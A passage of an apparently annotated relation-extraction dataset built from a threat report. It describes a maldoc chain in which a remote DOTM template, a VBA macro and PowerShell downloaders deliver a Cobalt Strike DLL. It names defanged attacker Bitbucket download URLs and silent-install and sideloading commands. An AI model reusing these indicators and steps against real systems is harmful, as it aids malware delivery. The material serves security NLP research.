4, "t": 6}, {"r": "CO", "evidence": [2, 3], "h": 8, "t": 11}, {"r": "CO", "evidence": [2, 3, 4], "h": 8, "t": 13}, {"r": "CO", "evidence": [2, 3, 4], "h": 8, "t": 14}, {"r": "CO", "evidence": [2, 3, 4, 5], "h": 8, "t": 18}, {"r": "CO", "evidence": [2, 3, 4, 5], "h": 8, "t": 16}, {"r": "FR", "evidence": [3], "h": 10, "t": 12}, {"r": "EX", "evidence": [3], "t": 11, "h": 12}, {"r": "FR", "evidence": [3, 4], "h": 10, "t": 15}, {"r": "WR", "evidence": [3], "t": 9, "h": 12}, {"r": "EX", "evidence": [4], "t": 14, "h": 15}, {"r": "FR", "evidence": [5], "h": 17, "t": 19}, {"r": "EX", "evidence": [5], "t": 18, "h": 19}, {"r": "FR", "evidence": [7], "h": 20, "t": 21}, {"r": "FR", "evidence": [7], "h": 21, "t": 22}, {"r": "WR", "evidence": [7], "h": 22, "t": 23}, {"r": "EX", "evidence": [7], "h": 22, "t": 23}]}, {"title": "063-18", "sents": [["The", "following", "actions", "are", "performed", "by", "the", "script", "upon", "its", "execution", "in", "victim", "'s", "system", "memory", ":", "The", "script", "downloads", "the", "payload", "from", "the", "actor", "controlled", "remote", "location", "through", "the", "URL", "``", "https", "[", ":", "//", "]", "bitbucket.org/atlasover/atlassiancore/downloads/newmodeler.dll", "''", "to", "the", "user", "profile", "local", "application", "temporary", "folder", "."], ["The", "script", "performs", "a", "check", "on", "the", "file", "extension", "of", "the", "downloaded", "payload", "file", "."], ["If", "the", "payload", "has", "the", "extension", ".dll", ",", "the", "script", "will", "run", "the", "DLL", "using", "rundll32.exe", "exhibiting", "the", "use", "of", "sideloading", "technique", "."], ["If", "the", "payload", "has", "an", "MSI", "file", "extension", ",", "the", "payload", "is", "executed", "using", "the", "command", "''", "msiexec", "/quiet", "/i", "<", "payload", ">", "''", "."], ["If", "the", "payload", "is", "an", "EXE", "file", ",", "then", "it", "will", "run", "it", "as", "a", "process", "using", "the", "PowerShell", "commandletStart-Process", "."], ["Upon", "running", "the", "payload", ",", "the", "script", "will", "hide", "the", "payload", "file", "to", "establish", "persistence", "by", "setting", "the", "``", "hidden", "''", "file", "system", "attribute", "of", "the", "payload", "file", "."], ["We", "spotted", "that", ",", "in", "the", "attack", "chain", ",", "the", "actor", "employed", "a", "64-bit", "Windows", "executable", "downloader", "which", "executes", "the", "PowerShell", "commands", "responsible", "for", "downloading", "and", "running", "the", "Cobalt", "Strike", "payload", "."], ["Stage", "1", "maldoc", ":", "DOTM", "templateWhen", "a", "victim", "opens", "the", "malicious", "document", ",", "Windows", "attempts", "to", "download", "a", "malicious", "remote", "DOTM", "template", "through", "the", "URL", "``", "https", "[", ":", "//", "]", "bitbucket.org/clouchfair/oneproject/downloads/ww.dotm", ",", "''", "which", "was", "embedded", "in", "its", "relationship", "component", "of", "the", "file", "settings.xml.rels", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [18, 18], "name": "script", "pos": [18, 19], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [21, 21], "name": "payload", "pos": [21, 22], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [32, 32], "name": "https [ : // ] bitbucket.org/atlasover/atlassiancore/downloads/newmodeler.dll", "pos": [32, 38], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [49, 49], "name": "script", "pos": [1, 2], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [60, 60], "name": "payload file", "pos": [12, 14], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [69, 69], "name": ".dll", "pos": [6, 7], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [72, 72], "name": "script", "pos": [9, 10], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [76, 76], "name": "DLL", "pos": [13, 14], "index": "7_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [78, 78], "name": "rundll32.exe", "pos": [15, 16], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [88, 88], "name": "payload", "pos": [2, 3], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [96, 96], "name": "payload", "pos": [10, 11], "index": "10_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [103, 103], "name": "msiexec", "pos": [17, 18], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [113, 113], "name": "payload", "pos": [2, 3], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [120, 120], "name": "it", "pos": [9, 10], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [123, 123], "name": "it", "pos": [12, 13], "index": "14_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [129, 129], "name": "PowerShell", "pos": [18, 19], "index": "15_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [171, 171], "name": "actor", "pos": [10, 11], "index": "16_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [177, 177], "name": "downloader", "pos": [16, 17], "index": "17_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [181, 181], "name": "PowerShell", "pos": [20, 21], "index": "18_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [191, 191], "name": "payload", "pos": [30, 31], "index": "19_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [200, 200], "name": "victim", "pos": [7, 8], "index": "20_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [204, 204], "name": "document", "pos": [11, 12], "index": "21_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [206, 206], "name": "Windows", "pos": [13, 14], "index": "22_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [213, 213], "name": "DOTM template", "pos": [20, 22], "index": "23_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [219, 219], "name": "https [ : // ] bitbucket.org/clouchfair/oneproject/downloads/ww.dotm", "pos": [26, 32], "index": "24_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "ST", "evidence": [0], "h": 0, "t": 2}, {"r": "RF", "evidence": [0], "h": 0, "t": 2}, {"r": "CO", "evidence": [1, 2], "h": 4, "t": 7}, {"r": "CO", "evidence": [1, 2, 3], "h": 4, "t": 9}, {"r": "CO", "evidence": [1, 2, 3], "h": 4, "t": 10}, {"r": "CO", "evidence": [1, 2, 3, 4], "h": 4, "t": 14}, {"r": "CO", "evidence": [1, 2, 3, 4], "h": 4, "t": 12}, {"r": "FR", "evidence": [2], "h": 6, "t": 8}, {"r": "EX", "evidence": [2], "t": 7, "h": 8}, {"r": "FR", "evidence": [2, 3], "h": 6, "t": 11}, {"r": "WR", "evidence": [2], "t": 5, "h": 8}, {"r": "EX", "evidence": [3], "t": 10, "h": 11}, {"r": "FR", "evidence": [4], "h": 13, "t": 15}, {"r": "EX", "evidence": [4], "t": 14, "h": 15}, {"r": "FR", "evidence": [6], "h": 16, "t": 17}, {"r": "FR", "evidence": [6], "h": 17, "t": 18}, {"r": "WR", "evidence": [6], "h": 18, "t": 19}, {"r": "EX", "evidence": [6], "h": 18, "t": 19}, {"r": "FR", "evidence": [7], "h": 20, "t": 22}, {"r": "EX", "evidence": [7], "t": 21, "h": 22}, {"r": "WR", "evidence": [7], "h": 22, "t": 23}, {"r": "ST", "evidence": [7], "h": 22, "t": 24}, {"r": "RF", "evidence": [7], "h": 22, "t": 24}]}, {"title": "063-19", "sents": [["The", "script", "performs", "a", "check", "on", "the", "file", "extension", "of", "the", "downloaded", "payload", "file", "."], ["If", "the", "payload", "has", "the", "extension", ".dll", ",", "the", "script", "will", "run", "the", "DLL", "using", "rundll32.exe", "exhibiting", "the", "use", "of", "sideloading", "technique", "."], ["If", "the", "payload", "has", "an", "MSI", "file", "extension", ",", "the", "payload", "is", "executed", "using", "the", "command", "''", "msiexec", "/quiet", "/i", "<", "payload", ">", "''", "."], ["If", "the", "payload", "is", "an", "EXE", "file", ",", "then", "it", "will", "run", "it", "as", "a", "process", "using", "the", "PowerShell", "commandletStart-Process", "."], ["Upon", "running", "the", "payload", ",", "the", "script", "will", "hide", "the", "payload", "file", "to", "establish", "persistence", "by", "setting", "the", "``", "hidden", "''", "file", "system", "attribute", "of", "the", "payload", "file", "."], ["We", "spotted", "that", ",", "in", "the", "attack", "chain", ",", "the", "actor", "employed", "a", "64-bit", "Windows", "executable", "downloader", "which", "executes", "the", "PowerShell", "commands", "responsible", "for", "downloading", "and", "running", "the", "Cobalt", "Strike", "payload", "."], ["Stage", "1", "maldoc", ":", "DOTM", "templateWhen", "a", "victim", "opens", "the", "malicious", "document", ",", "Windows", "attempts", "to", "download", "a", "malicious", "remote", "DOTM", "template", "through", "the", "URL", "``", "https", "[", ":", "//", "]", "bitbucket.org/clouchfair/oneproject/downloads/ww.dotm", ",", "''", "which", "was", "embedded", "in", "its", "relationship", "component", "of", "the", "file", "settings.xml.rels", "."], ["Stage", "2", "VB", "scriptThe", "DOTM", "template", "contains", "a", "VBA", "macro", "that", "executes", "a", "function", "to", "decode", "an", "encoded", "data", "block", "of", "the", "macro", "to", "generate", "the", "PowerShell", "downloader", "script", "and", "execute", "it", "with", "the", "shell", "function", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "script", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [12, 12], "name": "payload file", "pos": [12, 14], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [21, 21], "name": ".dll", "pos": [6, 7], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [24, 24], "name": "script", "pos": [9, 10], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [28, 28], "name": "DLL", "pos": [13, 14], "index": "4_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [30, 30], "name": "rundll32.exe", "pos": [15, 16], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [40, 40], "name": "payload", "pos": [2, 3], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [48, 48], "name": "payload", "pos": [10, 11], "index": "7_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [55, 55], "name": "msiexec", "pos": [17, 18], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [65, 65], "name": "payload", "pos": [2, 3], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [72, 72], "name": "it", "pos": [9, 10], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [75, 75], "name": "it", "pos": [12, 13], "index": "11_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [81, 81], "name": "PowerShell", "pos": [18, 19], "index": "12_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [123, 123], "name": "actor", "pos": [10, 11], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [129, 129], "name": "downloader", "pos": [16, 17], "index": "14_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [133, 133], "name": "PowerShell", "pos": [20, 21], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [143, 143], "name": "payload", "pos": [30, 31], "index": "16_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [152, 152], "name": "victim", "pos": [7, 8], "index": "17_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [156, 156], "name": "document", "pos": [11, 12], "index": "18_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [158, 158], "name": "Windows", "pos": [13, 14], "index": "19_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [165, 165], "name": "DOTM template", "pos": [20, 22], "index": "20_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [171, 171], "name": "https [ : // ] bitbucket.org/clouchfair/oneproject/downloads/ww.dotm", "pos": [26, 32], "index": "21_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [195, 195], "name": "DOTM template", "pos": [4, 6], "index": "22_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [199, 199], "name": "VBA macro", "pos": [8, 10], "index": "23_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [219, 219], "name": "script", "pos": [28, 29], "index": "24_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [222, 222], "name": "it", "pos": [31, 32], "index": "25_0"}]], "labels": [{"r": "CO", "evidence": [0, 1], "h": 1, "t": 4}, {"r": "CO", "evidence": [0, 1, 2], "h": 1, "t": 6}, {"r": "CO", "evidence": [0, 1, 2], "h": 1, "t": 7}, {"r": "CO", "evidence": [0, 1, 2, 3], "h": 1, "t": 11}, {"r": "CO", "evidence": [0, 1, 2, 3], "h": 1, "t": 9}, {"r": "FR", "evidence": [1], "h": 3, "t": 5}, {"r": "EX", "evidence": [1], "t": 4, "h": 5}, {"r": "FR", "evidence": [1, 2], "h": 3, "t": 8}, {"r": "WR", "evidence": [1], "t": 2, "h": 5}, {"r": "EX", "evidence": [2], "t": 7, "h": 8}, {"r": "FR", "evidence": [3], "h": 10, "t": 12}, {"r": "EX", "evidence": [3], "t": 11, "h": 12}, {"r": "FR", "evidence": [5], "h": 13, "t": 14}, {"r": "FR", "evidence": [5], "h": 14, "t": 15}, {"r": "WR", "evidence": [5], "h": 15, "t": 16}, {"r": "EX", "evidence": [5], "h": 15, "t": 16}, {"r": "FR", "evidence": [6], "h": 17, "t": 19}, {"r": "EX", "evidence": [6], "t": 18, "h": 19}, {"r": "WR", "evidence": [6], "h": 19, "t": 20}, {"r": "ST", "evidence": [6], "h": 19, "t": 21}, {"r": "RF", "evidence": [6], "h": 19, "t": 21}, {"r": "FR", "evidence": [6, 7], "h": 19, "t": 23}, {"r": "CO", "evidence": [6, 7], "h": 20, "t": 22}, {"r": "UK", "evidence": [7], "t": 22, "h": 23}, {"r": "CO", "evidence": [7], "h": 24, "t": 25}]}, {"title": "063-20", "sents": [["If", "the", "payload", "has", "the", "extension", ".dll", ",", "the", "script", "will", "run", "the", "DLL", "using", "rundll32.exe", "exhibiting", "the", "use", "of", "sideloading", "technique", "."], ["If", "the", "payload", "has", "an", "MSI", "file", "extension", ",", "the", "payload", "is", "executed", "using", "the", "command", "''", "msiexec", "/quiet", "/i", "<", "payload", ">", "''", "."], ["If", "the", "payload", "is", "an", "EXE", "file", ",", "then", "it", "will", "run", "it", "as", "a", "process", "using", "the", "PowerShell", "commandletStart-Process", "."], ["Upon", "running", "the", "payload", ",", "the", "script", "will", "hide", "the", "payload", "file", "to", "establish", "persistence", "by", "setting", "the", "``", "hidden", "''", "file", "system", "attribute", "of", "the", "payload", "file", "."], ["We", "spotted", "that", ",", "in", "the", "attack", "chain", ",", "the", "actor", "employed", "a", "64-bit", "Windows", "executable", "downloader", "which", "executes", "the", "PowerShell", "commands", "responsible", "for", "downloading", "and", "running", "the", "Cobalt", "Strike", "payload", "."], ["Stage", "1", "maldoc", ":", "DOTM", "templateWhen", "a", "victim", "opens", "the", "malicious", "document", ",", "Windows", "attempts", "to", "download", "a", "malicious", "remote", "DOTM", "template", "through", "the", "URL", "``", "https", "[", ":", "//", "]", "bitbucket.org/clouchfair/oneproject/downloads/ww.dotm", ",", "''", "which", "was", "embedded", "in", "its", "relationship", "component", "of", "the", "file", "settings.xml.rels", "."], ["Stage", "2", "VB", "scriptThe", "DOTM", "template", "contains", "a", "VBA", "macro", "that", "executes", "a", "function", "to", "decode", "an", "encoded", "data", "block", "of", "the", "macro", "to", "generate", "the", "PowerShell", "downloader", "script", "and", "execute", "it", "with", "the", "shell", "function", "."], ["Stage", "3", "PowerShell", "downloaderThe", "PowerShell", "downloader", "command", "downloads", "a", "64-bit", "Windows", "executable", "and", "runs", "it", "as", "a", "process", "in", "the", "victim", "'s", "machine", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [6, 6], "name": ".dll", "pos": [6, 7], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [9, 9], "name": "script", "pos": [9, 10], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [13, 13], "name": "DLL", "pos": [13, 14], "index": "2_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [15, 15], "name": "rundll32.exe", "pos": [15, 16], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [25, 25], "name": "payload", "pos": [2, 3], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [33, 33], "name": "payload", "pos": [10, 11], "index": "5_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [40, 40], "name": "msiexec", "pos": [17, 18], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [50, 50], "name": "payload", "pos": [2, 3], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [57, 57], "name": "it", "pos": [9, 10], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [60, 60], "name": "it", "pos": [12, 13], "index": "9_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [66, 66], "name": "PowerShell", "pos": [18, 19], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [108, 108], "name": "actor", "pos": [10, 11], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [114, 114], "name": "downloader", "pos": [16, 17], "index": "12_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [118, 118], "name": "PowerShell", "pos": [20, 21], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [128, 128], "name": "payload", "pos": [30, 31], "index": "14_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [137, 137], "name": "victim", "pos": [7, 8], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [141, 141], "name": "document", "pos": [11, 12], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [143, 143], "name": "Windows", "pos": [13, 14], "index": "17_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [150, 150], "name": "DOTM template", "pos": [20, 22], "index": "18_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [156, 156], "name": "https [ : // ] bitbucket.org/clouchfair/oneproject/downloads/ww.dotm", "pos": [26, 32], "index": "19_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [180, 180], "name": "DOTM template", "pos": [4, 6], "index": "20_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [184, 184], "name": "VBA macro", "pos": [8, 10], "index": "21_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [204, 204], "name": "script", "pos": [28, 29], "index": "22_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [207, 207], "name": "it", "pos": [31, 32], "index": "23_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [218, 218], "name": "downloader", "pos": [5, 6], "index": "24_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [224, 224], "name": "executable", "pos": [11, 12], "index": "25_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [227, 227], "name": "it", "pos": [14, 15], "index": "26_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [230, 230], "name": "process", "pos": [17, 18], "index": "27_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 1, "t": 3}, {"r": "EX", "evidence": [0], "t": 2, "h": 3}, {"r": "FR", "evidence": [0, 1], "h": 1, "t": 6}, {"r": "WR", "evidence": [0], "t": 0, "h": 3}, {"r": "EX", "evidence": [1], "t": 5, "h": 6}, {"r": "FR", "evidence": [2], "h": 8, "t": 10}, {"r": "EX", "evidence": [2], "t": 9, "h": 10}, {"r": "FR", "evidence": [4], "h": 11, "t": 12}, {"r": "FR", "evidence": [4], "h": 12, "t": 13}, {"r": "WR", "evidence": [4], "h": 13, "t": 14}, {"r": "EX", "evidence": [4], "h": 13, "t": 14}, {"r": "FR", "evidence": [5], "h": 15, "t": 17}, {"r": "EX", "evidence": [5], "t": 16, "h": 17}, {"r": "WR", "evidence": [5], "h": 17, "t": 18}, {"r": "ST", "evidence": [5], "h": 17, "t": 19}, {"r": "RF", "evidence": [5], "h": 17, "t": 19}, {"r": "FR", "evidence": [5, 6], "h": 17, "t": 21}, {"r": "CO", "evidence": [5, 6], "h": 18, "t": 20}, {"r": "UK", "evidence": [6], "t": 20, "h": 21}, {"r": "FR", "evidence": [6, 7], "h": 21, "t": 24}, {"r": "CO", "evidence": [6], "h": 22, "t": 23}, {"r": "EX", "evidence": [6, 7], "t": 22, "h": 24}, {"r": "WR", "evidence": [7], "h": 24, "t": 25}, {"r": "FR", "evidence": [7], "h": 24, "t": 27}, {"r": "EX", "evidence": [7], "t": 26, "h": 27}, {"r": "CO", "evidence": [7], "h": 25, "t": 26}]}, {"title": "063-21", "sents": [["If", "the", "payload", "has", "an", "MSI", "file", "extension", ",", "the", "payload", "is", "executed", "using", "the", "command", "''", "msiexec", "/quiet", "/i", "<", "payload", ">", "''", "."], ["If", "the", "payload", "is", "an", "EXE", "file", ",", "then", "it", "will", "run", "it", "as", "a", "process", "using", "the", "PowerShell", "commandletStart-Process", "."], ["Upon", "running", "the", "payload", ",", "the", "script", "will", "hide", "the", "payload", "file", "to", "establish", "persistence", "by", "setting", "the", "``", "hidden", "''", "file", "system", "attribute", "of", "the", "payload", "file", "."], ["We", "spotted", "that", ",", "in", "the", "attack", "chain", ",", "the", "actor", "employed", "a", "64-bit", "Windows", "executable", "downloader", "which", "executes", "the", "PowerShell", "commands", "responsible", "for", "downloading", "and", "running", "the", "Cobalt", "Strike", "payload", "."], ["Stage", "1", "maldoc", ":", "DOTM", "templateWhen", "a", "victim", "opens", "the", "malicious", "document", ",", "Windows", "attempts", "to", "download", "a", "malicious", "remote", "DOTM", "template", "through", "the", "URL", "``", "https", "[", ":", "//", "]", "bitbucket.org/clouchfair/oneproject/downloads/ww.dotm", ",", "''", "which", "was", "embedded", "in", "its", "relationship", "component", "of", "the", "file", "settings.xml.rels", "."], ["Stage", "2", "VB", "scriptThe", "DOTM", "template", "contains", "a", "VBA", "macro", "that", "executes", "a", "function", "to", "decode", "an", "encoded", "data", "block", "of", "the", "macro", "to", "generate", "the", "PowerShell", "downloader", "script", "and", "execute", "it", "with", "the", "shell", "function", "."], ["Stage", "3", "PowerShell", "downloaderThe", "PowerShell", "downloader", "command", "downloads", "a", "64-bit", "Windows", "executable", "and", "runs", "it", "as", "a", "process", "in", "the", "victim", "'s", "machine", "."], ["Stage", "4", "downloader", "executableThe", "downloader", "is", "a", "64-bit", "executable", "that", "runs", "as", "a", "process", "in", "the", "victim", "'s", "environment", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [2, 2], "name": "payload", "pos": [2, 3], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [10, 10], "name": "payload", "pos": [10, 11], "index": "1_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [17, 17], "name": "msiexec", "pos": [17, 18], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [27, 27], "name": "payload", "pos": [2, 3], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [34, 34], "name": "it", "pos": [9, 10], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [37, 37], "name": "it", "pos": [12, 13], "index": "5_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [43, 43], "name": "PowerShell", "pos": [18, 19], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [85, 85], "name": "actor", "pos": [10, 11], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [91, 91], "name": "downloader", "pos": [16, 17], "index": "8_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [95, 95], "name": "PowerShell", "pos": [20, 21], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [105, 105], "name": "payload", "pos": [30, 31], "index": "10_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [114, 114], "name": "victim", "pos": [7, 8], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [118, 118], "name": "document", "pos": [11, 12], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [120, 120], "name": "Windows", "pos": [13, 14], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [127, 127], "name": "DOTM template", "pos": [20, 22], "index": "14_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [133, 133], "name": "https [ : // ] bitbucket.org/clouchfair/oneproject/downloads/ww.dotm", "pos": [26, 32], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [157, 157], "name": "DOTM template", "pos": [4, 6], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [161, 161], "name": "VBA macro", "pos": [8, 10], "index": "17_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [181, 181], "name": "script", "pos": [28, 29], "index": "18_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [184, 184], "name": "it", "pos": [31, 32], "index": "19_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [195, 195], "name": "downloader", "pos": [5, 6], "index": "20_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [201, 201], "name": "executable", "pos": [11, 12], "index": "21_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [204, 204], "name": "it", "pos": [14, 15], "index": "22_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [207, 207], "name": "process", "pos": [17, 18], "index": "23_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [218, 218], "name": "downloader", "pos": [4, 5], "index": "24_0"}]], "labels": [{"r": "EX", "evidence": [0], "t": 1, "h": 2}, {"r": "FR", "evidence": [1], "h": 4, "t": 6}, {"r": "EX", "evidence": [1], "t": 5, "h": 6}, {"r": "FR", "evidence": [3], "h": 7, "t": 8}, {"r": "FR", "evidence": [3], "h": 8, "t": 9}, {"r": "WR", "evidence": [3], "h": 9, "t": 10}, {"r": "EX", "evidence": [3], "h": 9, "t": 10}, {"r": "FR", "evidence": [4], "h": 11, "t": 13}, {"r": "EX", "evidence": [4], "t": 12, "h": 13}, {"r": "WR", "evidence": [4], "h": 13, "t": 14}, {"r": "ST", "evidence": [4], "h": 13, "t": 15}, {"r": "RF", "evidence": [4], "h": 13, "t": 15}, {"r": "FR", "evidence": [4, 5], "h": 13, "t": 17}, {"r": "CO", "evidence": [4, 5], "h": 14, "t": 16}, {"r": "UK", "evidence": [5], "t": 16, "h": 17}, {"r": "FR", "evidence": [5, 6], "h": 17, "t": 20}, {"r": "CO", "evidence": [5], "h": 18, "t": 19}, {"r": "EX", "evidence": [5, 6], "t": 18, "h": 20}, {"r": "WR", "evidence": [6], "h": 20, "t": 21}, {"r": "FR", "evidence": [6], "h": 20, "t": 23}, {"r": "EX", "evidence": [6], "t": 22, "h": 23}, {"r": "CO", "evidence": [6], "h": 21, "t": 22}, {"r": "CO", "evidence": [6, 7], "h": 20, "t": 24}]}, {"title": "063-22", "sents": [["If", "the", "payload", "is", "an", "EXE", "file", ",", "then", "it", "will", "run", "it", "as", "a", "process", "using", "the", "PowerShell", "commandletStart-Process", "."], ["Upon", "running", "the", "payload", ",", "the", "script", "will", "hide", "the", "payload", "file", "to", "establish", "persistence", "by", "setting", "the", "``", "hidden", "''", "file", "system", "attribute", "of", "the", "payload", "file", "."], ["We", "spotted", "that", ",", "in", "the", "attack", "chain", ",", "the", "actor", "employed", "a", "64-bit", "Windows", "executable", "downloader", "which", "executes", "the", "PowerShell", "commands", "responsible", "for", "downloading", "and", "running", "the", "Cobalt", "Strike", "payload", "."], ["Stage", "1", "maldoc", ":", "DOTM", "templateWhen", "a", "victim", "opens", "the", "malicious", "document", ",", "Windows", "attempts", "to", "download", "a", "malicious", "remote", "DOTM", "template", "through", "the", "URL", "``", "https", "[", ":", "//", "]", "bitbucket.org/clouchfair/oneproject/downloads/ww.dotm", ",", "''", "which", "was", "embedded", "in", "its", "relationship", "component", "of", "the", "file", "settings.xml.rels", "."], ["Stage", "2", "VB", "scriptThe", "DOTM", "template", "contains", "a", "VBA", "macro", "that", "executes", "a", "function", "to", "decode", "an", "encoded", "data", "block", "of", "the", "macro", "to", "generate", "the", "PowerShell", "downloader", "script", "and", "execute", "it", "with", "the", "shell", "function", "."], ["Stage", "3", "PowerShell", "downloaderThe", "PowerShell", "downloader", "command", "downloads", "a", "64-bit", "Windows", "executable", "and", "runs", "it", "as", "a", "process", "in", "the", "victim", "'s", "machine", "."], ["Stage", "4", "downloader", "executableThe", "downloader", "is", "a", "64-bit", "executable", "that", "runs", "as", "a", "process", "in", "the", "victim", "'s", "environment", "."], ["It", "executes", "the", "PowerShell", "command", ",", "which", "downloads", "the", "Cobalt", "Strike", "payload", "DLL", "through", "the", "URL", "``", "https", "[", ":", "//", "]", "bitbucket.org/clouchfair/oneproject/downloads/strymon.png", "''", "to", "the", "userprofile", "local", "application", "temporary", "directory", "with", "a", "spoofed", "extension", ".png", "and", "sideloads", "the", "DLL", "using", "rundll32.exe", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [2, 2], "name": "payload", "pos": [2, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [9, 9], "name": "it", "pos": [9, 10], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [12, 12], "name": "it", "pos": [12, 13], "index": "2_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [18, 18], "name": "PowerShell", "pos": [18, 19], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [60, 60], "name": "actor", "pos": [10, 11], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [66, 66], "name": "downloader", "pos": [16, 17], "index": "5_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [70, 70], "name": "PowerShell", "pos": [20, 21], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [80, 80], "name": "payload", "pos": [30, 31], "index": "7_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [89, 89], "name": "victim", "pos": [7, 8], "index": 